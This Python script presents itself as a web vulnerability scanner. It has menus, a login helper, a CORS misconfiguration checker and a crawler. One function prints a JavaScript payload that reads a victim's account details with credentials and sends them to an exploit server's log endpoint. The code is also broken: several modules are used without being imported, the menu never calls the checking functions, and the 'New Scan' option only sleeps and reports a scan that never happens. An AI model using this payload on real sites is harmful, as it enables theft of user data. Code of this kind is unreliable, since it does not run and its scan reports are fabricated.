import time
import requests
from bs4 import BeautifulSoup

# Initialize global variables
link_list = []
stopped = False
browser = mechanize.Browser()


def BeginProgram():
    print("******************************************************************************************************************")
    print("******************************************************************************************************************")
    print("      *******  ####         ####  #####   #####  #####      ########  ########   ########  ########  *******      ")
    print("     *******    ##           ##    ###     ###    ###        ##        ##  ###    ##        ##        *******     ")
    print("                 ##         ##     ###     ###    ###        #####     ## ###     ##        ##                    ")
    print("    *******       ##       ##      ###     ###    ###        ##        #####      ####      ####       *******    ")
    print("                   ##     ##       ###     ###    ###        ##        ## ###     ##        ##                    ")
    print("     *******        ##   ##        ###     ###    ###        ##        ##  ###    ##        ##        *******     ")
    print("      *******        #####         ###########    ########  ####      ####  ###  ########  ########  *******      ")
    print("************************************************Less Vulnerability, More Security*********************************")
    print("******************************************************************************************************************")
    print("******************************************************************************************************************\n\n\n")

    MainMenu()

def EndProgram():
    print("**********************************************************")
    print("**********************************************************")
    print("      ******* #######  ##       ##  ######  *******       ")
    print("     *******  ##       ## ##    ##    ##  ##  *******     ")
    print("              ##       ##  ##   ##    ##   ##             ")
    print("    *******   ####     ##   ##  ##    ##    ## *******    ")
    print("              ##       ##    ## ##    ##   ##             ")
    print("     *******  ##       ##     ####    ##  ##  *******     ")
    print("      ******* ######   ##      ##   ######   *******      ")
    print("**********************************************************")
    print("**********************************************************\n\n\n")
    exit(0)

def MainMenu():
    print("                        Welcome to Main Menu                            ")
    print("*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$")
    print("*$*$*$*$*$*$*$*$*$*$*$*$*$*$ Main Menu *$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*")
    print("1 - Learn More")
    print("2 - Scan")
    print("3 - Quit")
    print("4 - Help")
    print("*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$")
    print("*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$\n\n")

    choice = int(input("Make a choice: "))

    while True:
        if choice == 1:
            LearnMore()
            break
        elif choice == 2:
            MenuScan()
            break
        elif choice == 3:
            print("\nExiting the program...\n\n")
            EndProgram()
            break
        elif choice == 4:
            Help()
            break
        else:
            choice = int(input("Key invalid. Choose another number: "))

def Help():
    print("Opening Help")
    EndProgram()

def LearnMore():
    print("To Learn More")
    EndProgram()

def MenuScan():
    print("\n\n                    Welcome to Menu Scan")
    print("*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$")
    print("*$*$*$*$*$*$*$*$*$*$*$*$*$*$ SCAN*$*$*$*$*$*$*$*$*$*$*$*$*$*$")
    print("1 - New Scan")
    print("2 - List Previous Scan")
    print("3 - Main Menu")
    print("4 - Quit")
    print("5 - Help")
    print("*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$")
    print("*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$\n\n")

    input_choice = int(input("Make a choice: "))

    while True:
        if input_choice == 1:
            NewScan()
            break
        elif input_choice == 2:
            ListScan()
            break
        elif input_choice == 3:
            print("\nExiting the program...\n\n")
            EndProgram()
            break
        elif input_choice == 4:
            Help()
            break
        else:
            input_choice = int(input("Key invalid. Choose another number: "))

def NewScan():
    print("\n\n**$**$**$**$**$**$**$**$**$**$**$**$**$**$**")
    print("**$**$**$**$**$** NEW SCAN **$**$**$**$**$**")
    print("**$**$**$**$**$**$**$**$**$**$**$**$**$**$**\n\n")
    
    input_address = input("Enter the address of the website: ")

    while not input_address:
        input_address = input("Input invalid. Write a correct address: ")

    print("Scan ongoing ..")
    time.sleep(15)
    print("Scan finished. End of the program..")
    EndProgram()

def ListScan():
    print("List Previous Scan")
    EndProgram()


def login_and_get_session(login_url, username, password):
    session = requests.Session()
    
    # Get the login page first to capture hidden form fields (like CSRF tokens)
    login_page = session.get(login_url)
    if login_page.status_code != 200:
        print(f"[!] Failed to load login page, status code: {login_page.status_code}")
        return None

    soup = BeautifulSoup(login_page.content, 'html.parser')

    # Find the login form and extract hidden input fields
    login_form = soup.find('form')
    if not login_form:
        print("[!] Login form not found")
        return None

    form_data = {}
    for input_tag in login_form.find_all('input'):
        if input_tag.get('name'):
            form_data[input_tag['name']] = input_tag.get('value', '')

    print(f"[DEBUG] Form data before adding credentials: {form_data}")

    # Update the form data with username and password
    form_data.update({
        'username': username,
        'password': password
    })

    print(f"[DEBUG] Form data after adding credentials: {form_data}")

    # Submit the login form
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    response = session.post(login_url, data=form_data, headers=headers, allow_redirects=True)
    if response.status_code == 200 and 'session' in session.cookies:
        print("[+] Logged in successfully")
        return session
    else:
        print(f"[!] Login failed, status code: {response.status_code}")
        print(f"[DEBUG] Response content: {response.content}")
        return None


def check_cors_vulnerability(session, url, evil_origin):
    headers = {
        'Origin': evil_origin,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    try:
        response = session.get(url, headers=headers)
        cors_origin = response.headers.get('Access-Control-Allow-Origin')
        cors_credentials = response.headers.get('Access-Control-Allow-Credentials')

        print(f"[DEBUG] Response Headers: {response.headers}")

        if cors_origin and cors_credentials:
            if cors_origin == evil_origin and cors_credentials == 'true':
                print(f"[+] Vulnerable to CORS: {url}")
                return True
            else:
                print(f"[-] Reflecting but not vulnerable: {url}")
                return False
        else:
            print(f"[-] No CORS headers present: {url}")
            return False
    except requests.RequestException as e:
        print(f"[!] Error: {e}")
        return False


def exploit_cors_vulnerability(lab_url, exploit_server_url):
    exploit_html = f"""
    <script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('get','{lab_url}/accountDetails',true);
        req.withCredentials = true;
        req.send();

        function reqListener() {{
            location='{exploit_server_url}/log?key=' + this.responseText;
        }};
    </script>
    """
    print("[+] Use the following HTML to exploit the vulnerability:")
    print(exploit_html)


def initialize_browser(proxy=None, user_agent="Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0"):
    browser.set_handle_robots(False)
    browser.addheaders = [("User-agent", user_agent)]
    if proxy:
        browser.set_proxies(proxy)


def get_page_source(url):
    """
    Obtains the HTML source code of a web page.
    :param url: The URL of the page.
    :return: The HTML source code of the page.
    """
    try:
        res = browser.open(url.strip())
    except Exception as e:
        print("[-] Error for page: " + url + " " + str(e))
        return None
    return res


def get_page_links(url):
    """
    Obtains internal links from a web page.
    :param url: The URL of the page.
    :return: A list of internal links found on the page.
    """
    global browser
    link_list = []
    source = get_page_source(url)

    if source is not None:
        soup = BeautifulSoup(source, "html.parser")
        uparse = urlparse(url)
        for link in soup.find_all("a"):
            href = link.get("href")
            if href:
                if "#" in href:
                    href = href.split("#")[0]
                new_link = urllib.parse.urljoin(url, href)
                if uparse.hostname in new_link and new_link not in link_list:
                    link_list.append(new_link)
        return link_list
    else:
        return []


def crawl(url):
    """
    Recursively crawls and indexes a web page.
    :param url: The URL of the page.
    """
    global link_list, stopped
    try:
        page_links = get_page_links(url)
        for link in page_links:
            if stopped:
                break
            if link not in link_list:
                link_list.append(link)
                crawl(link)
    except KeyboardInterrupt:
        print("\nProgram interrupted by user")
        sys.exit(1)
    except Exception as e:
        print("\nError: " + str(e))
        sys.exit(2)


def print_link_list():
    """
    Prints the list of crawled links.
    """
    global link_list
    print("The found links are:")
    for link in link_list:
        print(link)




if __name__ == "__main__":
    BeginProgram()
